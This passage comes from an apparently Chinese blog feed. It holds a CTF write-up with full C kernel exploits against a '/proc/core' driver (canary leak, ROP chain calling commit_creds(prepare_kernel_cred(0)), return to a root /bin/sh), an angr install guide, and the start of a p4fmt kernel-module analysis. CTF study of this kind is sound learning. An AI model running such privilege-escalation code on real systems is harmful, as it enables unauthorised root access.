&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b1_&gt;0x%lx\n"</span>,<span class="number">0xffffffff81a012da</span> + offset);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    </span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;         <span class="comment">// rip </span></span><br><span class="line">    </span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd,CORE_WRITE, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>re2usr exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_READ  0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_SET   0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_WRITE 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags,user_sp;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">    <span class="string">"movq %%rsp, %2\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"popq %3\n"</span></span><br><span class="line">    : <span class="string">"=r"</span> (user_cs), <span class="string">"=r"</span> (user_ss),<span class="string">"=r"</span>(user_sp),<span class="string">"=r"</span> (user_rflags) : : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_uid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> find_symbols()&#123;</span><br><span class="line">    FILE * fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"commit_creds addr: %p\n"</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"vmlinux_base addr: %p\n"</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"prepare_kernel_cred addr: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open /proc/core error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,CORE_SET, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,CORE_READ, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b1_&gt;0x%lx\n"</span>,<span class="number">0xffffffff81a012da</span> + offset);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[i++] = getuid;</span><br><span class="line">    </span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;         <span class="comment">// rip </span></span><br><span class="line">    </span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd,CORE_WRITE, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x</a><br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-2/" target="_blank" rel="noopener">M4x</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr安装</title>
      <link href="/2020/02/12/angr%E5%AE%89%E8%A3%85/"/>
      <url>/2020/02/12/angr%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="首先安装运行的虚拟环境"><a href="#首先安装运行的虚拟环境" class="headerlink" title="首先安装运行的虚拟环境"></a>首先安装运行的虚拟环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-virtualenv</span><br><span class="line">sudo pip install virtualenvwrapper</span><br><span class="line">python的版本没有3.6以上的好像有个模块不支持，成不了。所以建议用python3.6以上的版本编译</span><br></pre></td></tr></table></figure><h3 id="查找virtualenvwrapper-sh的路径"><a href="#查找virtualenvwrapper-sh的路径" class="headerlink" title="查找virtualenvwrapper.sh的路径"></a>查找virtualenvwrapper.sh的路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><h3 id="修改环境变量"><a href="#修改环境变量" class="headerlink" title="修改环境变量"></a>修改环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="然后创建一个环境，再安装angr"><a href="#然后创建一个环境，再安装angr" class="headerlink" title="然后创建一个环境，再安装angr"></a>然后创建一个环境，再安装angr</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv angr</span><br><span class="line">sudo pip3 install angr</span><br></pre></td></tr></table></figure><p>这样就成功了</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="pip：Import-Error-cannot-import-name-main"><a href="#pip：Import-Error-cannot-import-name-main" class="headerlink" title="pip：Import Error:cannot import name main"></a>pip：Import Error:cannot import name main</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决方案</span><br><span class="line">1、 from pip._internal import main</span><br><span class="line">2、 </span><br><span class="line">from pip import __main__</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure><h4 id="TypeError-new-got-an-unexpected-keyword-argument-‘serialized-options’"><a href="#TypeError-new-got-an-unexpected-keyword-argument-‘serialized-options’" class="headerlink" title="TypeError: new() got an unexpected keyword argument ‘serialized_options’"></a>TypeError: <strong>new</strong>() got an unexpected keyword argument ‘serialized_options’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在终端上的 protoc 版本 与pycharm 中用conda 安装的protobuf版本不一样。</span><br><span class="line">然后在终端上进行proto文件编译，在pycharm上运行相关脚本，出现以上错误。</span><br><span class="line">在pycharm中调整protobuf的版本后错误消失。</span><br><span class="line">pip uninstall protobuf</span><br><span class="line">pip install protobuf</span><br></pre></td></tr></table></figure><h4 id="遇到pdr无法安装"><a href="#遇到pdr无法安装" class="headerlink" title="遇到pdr无法安装"></a>遇到pdr无法安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手动安装一下就ok</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Automation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>p4fmt TeaserCONFidence2019 CTF </title>
      <link href="/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/"/>
      <url>/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>有三个文件<br><code>bzImage  initramfs.cpio.gz  run.sh</code><br>run.sh:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1   │ #!/bin/bash</span><br><span class="line">2   │ qemu-system-x86_64 -kernel ./bzImage \</span><br><span class="line">3   │         -initrd ./initramfs.cpio.gz \</span><br><span class="line">4   │         -nographic \</span><br><span class="line">5   │         -append &quot;console=ttyS0&quot; \</span><br></pre></td></tr></table></figure><p>启动qemu脚本，里面有给的提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">====================</span><br><span class="line">p4fmt</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Kernel challs are always a bit painful.</span><br><span class="line">No internet access, no SSH, no file copying.</span><br><span class="line"></span><br><span class="line">You&apos;re stuck with copy pasting base64&apos;d (sometimes static) ELFs.</span><br><span class="line">But what if there was another solution?</span><br><span class="line"></span><br><span class="line">We&apos;ve created a lightweight, simple binary format for your</span><br><span class="line">pwning pleasure. It&apos;s time to prove your skills.</span><br></pre></td></tr></table></figure><p>可以看到，这个说给出了一个新的<code>二进制格式</code><br>目录下面有一个 <code>p4fmt.ko</code><br>p4fmt.ko</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">里面注册了四个函数</span><br><span class="line">load_p4_binary</span><br><span class="line">load_p4_binary_cold_2</span><br><span class="line">p4fmt_init</span><br><span class="line">p4fmt_exit</span><br></pre></td></tr></table></figure><p>p4fmt_init 和 p4fmt_exit 分别注册和注销 一个文件格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">p4fmt_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _register_binfmt(&amp;p4format, <span class="number">1L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line">__<span class="function">int64 <span class="title">p4fmt_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> unregister_binfmt(&amp;p4format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看 load_p4_binary_cold_2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:000000000000018E load_p4_binary_cold_2 proc near         ; CODE XREF: load_p4_binary:loc_47↑j</span><br><span class="line">.text.unlikely:000000000000018E                 mov     rdi, offset unk_275</span><br><span class="line">.text.unlikely:0000000000000195                 mov     ebp, 0FFFFFFF8h</span><br><span class="line">.text.unlikely:000000000000019A                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000019F                 jmp     loc_65</span><br><span class="line">.text.unlikely:000000000000019F load_p4_binary_cold_2 endp</span><br><span class="line"></span><br><span class="line">.rodata.str1.1:0000000000000275 unk_275         db    1                 ; DATA XREF: load_p4_binary_cold_2↑o</span><br><span class="line">.rodata.str1.1:0000000000000276                 db  37h ; 7</span><br><span class="line">.rodata.str1.1:0000000000000277                 db  55h ; U</span><br><span class="line">.rodata.str1.1:0000000000000278                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:0000000000000279                 db  6Bh ; k</span><br><span class="line">.rodata.str1.1:000000000000027A                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:000000000000027B                 db  6Fh ; o</span><br><span class="line">.rodata.str1.1:000000000000027C                 db  77h ; w</span><br><span class="line">.rodata.str1.1:000000000000027D                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:000000000000027E                 db  20h</span><br><span class="line">.rodata.str1.1:000000000000027F                 db  76h ; v</span><br><span class="line">.rodata.str1.1:0000000000000280                 db  65h ; e</span><br><span class="line">.rodata.str1.1:0000000000000281                 db  72h ; r</span><br><span class="line">.rodata.str1.1:0000000000000282                 db  73h ; s</span><br><span class="line">.rodata.str1.1:0000000000000283                 db  69h ; i</span><br><span class="line">.rodata.str1.1:0000000000000284                 db  6Fh ; o</span><br><span class="line">.rodata.str1.1:0000000000000285                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:0000000000000286                 db  0Ah</span><br><span class="line">.rodata.str1.1:0000000000000287                 db    0</span><br><span class="line">.rodata.str1.1:0000000000000287 _rodata_str1_1  ends</span><br><span class="line"></span><br><span class="line">明显这个是一个版本错误的info</span><br><span class="line">然后退出</span><br></pre></td></tr></table></figure><p>想来这个load_p4_binary才是关键的，仔细看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000                 push    r15</span><br><span class="line">.text:0000000000000002                 mov     ecx, 2</span><br><span class="line">.text:0000000000000007                 mov     rsi, offset P4 \\P4，相当于一个magic </span><br><span class="line">.text:000000000000000E                 push    r14</span><br><span class="line">.text:0000000000000010                 push    r13</span><br><span class="line">.text:0000000000000012                 push    r12</span><br><span class="line">.text:0000000000000014                 lea     r12, [rdi+48h]</span><br><span class="line">.text:0000000000000018                 push    rbp</span><br><span class="line">.text:0000000000000019                 push    rbx</span><br><span class="line">.text:000000000000001A                 mov     rbx, rdi</span><br><span class="line">.text:000000000000001D                 mov     rdi, r12</span><br><span class="line">.text:0000000000000020                 mov     r14, gs:current_task</span><br><span class="line">.text:0000000000000029                 sub     rsp, 8</span><br><span class="line">.text:000000000000002D                 mov     r13, [r14+2A0h]</span><br><span class="line">.text:0000000000000034                 repe cmpsb</span><br><span class="line">.text:0000000000000036                 setnbe  al      \\ 从 0x48开始判断，这里判断前面两字节是否相等</span><br><span class="line">.text:0000000000000039                 sbb     al, 0</span><br><span class="line">.text:000000000000003B                 test    al, al</span><br><span class="line">.text:000000000000003D                 jnz     loc_184</span><br><span class="line">.text:0000000000000043                 cmp     byte ptr [rbx+4Ah], 0 \\这些判断版本是否正确，version = 0</span><br><span class="line">.text:0000000000000047</span><br><span class="line">.text:0000000000000047 loc_47:</span><br><span class="line">.text:0000000000000047                 jnz     load_p4_binary_cold_2</span><br><span class="line">.text:000000000000004D                 cmp     byte ptr [rbx+4Bh], 1 \\ 0x4b这个byte 不能大于1</span><br><span class="line">.text:0000000000000051                 ja      loc_17A</span><br><span class="line">.text:0000000000000057                 mov     rdi, rbx</span><br><span class="line">.text:000000000000005A                 call    flush_old_exec  ; PIC mode</span><br><span class="line"></span><br><span class="line">flush_old_exec:</span><br><span class="line">停止当前进程内的所有线程，清空当前内存空间，重置各种状态</span><br></pre></td></tr></table></figure><p>接下来有两种处理方式，由<code>0x4b</code>byte 决定,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span 